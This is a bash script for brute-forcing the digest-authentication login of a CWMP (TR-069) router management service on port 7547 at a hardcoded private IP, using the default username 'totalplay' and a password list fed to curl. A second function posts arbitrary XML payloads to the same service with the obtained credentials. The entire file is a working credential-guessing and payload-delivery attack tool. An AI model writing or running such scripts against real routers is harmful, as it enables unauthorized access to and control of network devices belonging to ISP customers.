#!/bin/bash

# This code is for brute forcing the cwmp service running on port 7547

http_brute(){

	# This function receives the password list from terminal
	password_list="$1"
	
	target_ip="10.104.24.79"
	target_port="7547"

	user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
	resultant_directory="/home/grimaldi/Bash/Telnet/analysis/http_requests"

	username="totalplay"
	password="totalplay"
	
	cont=1
	while IFS= read -r password; do
		bname="${target_ip}_${password}"
		result_path="${resultant_directory}/${bname}"

		# Variant 1: Digest authentication with headers
		curl -A "$user_agent" --digest -u "$username:$password" "http://${target_ip}:${target_port}/" -v 2>"$result_path"

		result="Failed" # Default result
		searched_pattern="200 OK" # Successful pattern
		if grep -q "$searched_pattern" "$result_path"; then
			result="Success"
		fi	

		#echo
		echo "[$cont] [$result] [$target_ip] [$username:$password]"
		
		((cont += 1))

	done < "$password_list"
}

xml_payload (){

	# This function receives the xml payload
	payload="$1"
	
	target_ip="10.104.24.79"
	target_port="7547"

	user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
	resultant_directory="/home/grimaldi/Bash/Telnet/analysis/http_requests"

	username="totalplay"
	password="totalplay"
	
	bname="${target_ip}_$(basename "$payload")"
	result_path="${resultant_directory}/${bname}"


	# Variant 1: Digest authentication with headers
	#curl -A "$user_agent" --digest -u "$username:$password" -d @"$payload" "http://${target_ip}:${target_port}/" -v 2>"$result_path"
	#curl -A "$user_agent" --digest -u "$username:$password" -d @"$payload" "http://${target_ip}:${target_port}/" -v
	#curl -A "$user_agent" --digest -u "$username:$password" "http://${target_ip}:${target_port}/" -v

	# Calculate payload length
    payload_length=$(stat -c%s "$payload")

	printf "Payload Length: %s\n\n" "$payload_length"

	#return 0

	# Print payload content for debugging
    echo "Payload Content:"
    cat "$payload"
    echo ""

    # Send the POST request with the correct headers
    curl -s -A "$user_agent" \
         --digest -u "$username:$password" \
         -H "Content-Type: text/xml" \
         -H "Content-Length: $payload_length" \
         --data @"$payload" \
         "http://${target_ip}:${target_port}/" \
         -v 2>&1 | tee "$result_path"

}
